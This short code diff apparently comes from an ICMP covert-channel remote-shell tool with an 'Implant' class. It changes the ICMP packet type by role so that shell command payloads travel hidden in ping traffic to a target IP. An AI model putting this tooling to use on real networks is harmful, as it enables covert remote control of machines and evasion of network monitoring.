@@ -171,8 +171,16 @@ class Host:
         
         shellpacks = self.build_shellpacks(command=command, data=data, option=option, target_id=target_id)
 
+
+        # Get ICMP Type
+        icmp_type = 0
+        if type(self).__name__ == 'Implant':
+            icmp_type = 8
+        
+
+
         for shellpack in shellpacks:
-            data = (IP(dst=ip, ttl=TTL)/ICMP(type=8, id=ICMP_ID)/Raw(load=shellpack))
+            data = (IP(dst=ip, ttl=TTL)/ICMP(type=icmp_type, id=ICMP_ID)/Raw(load=shellpack))
             sr(data, timeout=0, verbose=0)
 
     def get_iface(self, ip: str) -> str:
